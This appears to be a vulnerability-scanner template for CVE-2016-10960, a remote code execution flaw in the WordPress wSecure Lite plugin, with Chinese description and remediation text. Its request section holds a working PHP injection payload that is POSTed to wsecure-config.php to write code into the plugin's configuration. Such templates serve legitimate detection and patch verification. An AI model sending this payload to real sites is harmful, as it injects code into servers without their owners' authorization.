id: CVE-2016-10960
info:
  name: WordPress wSecure Lite < 2.4 - Remote Code Execution
  author:
  - l0ne1y
  tags:
  - cve
  - cve2016
  - wordpress
  - wp-plugin
  - rce
  description: |-
    WordPress Plugin wsecure 输入验证错误导致远程代码执行漏洞
    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。wsecure是是用在其中的一个用于隐藏网站管理路径的插件。

    WordPress wsecure插件2.4之前版本中存在安全漏洞。远程攻击者可利用该漏洞执行代码。
  reference:
  - https://www.pluginvulnerabilities.com/2016/07/12/remote-code-execution-rce-vulnerability-in-wsecure-lite/
  - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-wsecure-lite-remote-code-execution-2-3/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-10960
  - https://wordpress.org/plugins/wsecure/#developers
  severity: high
  classification:
    cve-id:
    - cve-2016-10960
    cwe-id:
    - cwe-20
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://wordpress.org/plugins/wsecure/#developers
requests:
- matchers:
  - type: word
    condition: and
    part: header
    words:
    - '{{randstr}}'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/wsecure/wsecure-config.php'
  method: POST
  body: wsecure_action=update&publish=";} header({{randstr}}); class WSecureConfig2
    {var $test="
